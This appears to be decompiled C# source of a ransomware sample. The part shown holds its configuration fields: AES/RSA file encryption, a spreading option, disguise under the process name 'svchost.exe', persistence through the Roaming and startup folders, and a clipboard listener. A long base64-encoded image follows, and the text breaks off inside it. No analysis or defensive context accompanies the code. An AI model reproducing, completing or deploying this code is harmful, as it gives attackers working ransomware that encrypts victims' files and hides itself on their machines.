using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = false;

	private static string spreadName = "surprise";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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